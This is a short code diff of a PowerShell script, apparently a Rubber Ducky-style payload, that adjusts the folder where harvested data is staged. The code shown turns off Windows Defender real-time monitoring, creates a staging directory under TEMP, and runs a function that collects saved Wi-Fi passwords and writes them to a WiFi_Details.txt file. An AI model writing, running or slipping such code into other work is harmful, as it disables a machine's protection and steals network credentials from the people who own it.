@@ -3,11 +3,11 @@
 
 
 
-$duckletter = $env:TEMP\Cache
+$duckletter = $env:TEMP
 
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-$destDir = "$duckletter\$env:USERNAME"
+$destDir = "$duckletter\Cache\$env:USERNAME"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir
 }
@@ -95,7 +95,7 @@ function GetWifiPasswords {
     $results | Format-Table -AutoSize
 
     # Save results to a file
-    $results | Out-File -FilePath "$duckletter\$env:USERNAME\WiFi_Details.txt"
+    $results | Out-File -FilePath "$duckletter\Cache\$env:USERNAME\WiFi_Details.txt"
 }
 
 GetWifiPasswords
